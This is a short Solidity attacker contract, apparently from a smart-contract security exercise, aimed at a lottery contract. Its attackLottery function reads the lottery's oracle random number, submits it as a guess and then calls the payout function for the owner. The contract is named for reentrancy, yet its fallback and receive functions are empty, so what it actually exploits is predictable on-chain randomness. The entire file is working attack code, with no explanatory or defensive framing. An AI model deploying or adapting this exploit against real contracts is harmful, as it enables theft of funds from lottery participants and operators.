// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface  ILottery {
  function makeAGuess(address _team, uint256 _guess) external returns(bool); 
  function payoutWinningTeam(address _team) external returns(bool);
}

interface IOracle {
 function getRandomNumber() external view returns (uint256);
}

contract lotteryReentrancy {
 ILottery public lottery;
 IOracle public oracle;
 
 address contractOwner;
    
 modifier onlyOwner {
  require(msg.sender == contractOwner);
  _;
 }   
 
 constructor(address _lottery, address _oracle){
  contractOwner = msg.sender;
  lottery = ILottery(_lottery);
  oracle = IOracle(_oracle);
 }
 
 function attackLottery() public payable onlyOwner {
  lottery.makeAGuess(contractOwner, oracle.getRandomNumber());
  
  lottery.payoutWinningTeam(contractOwner);
 }
 
 fallback() external payable {}
 
 receive() external payable {}
}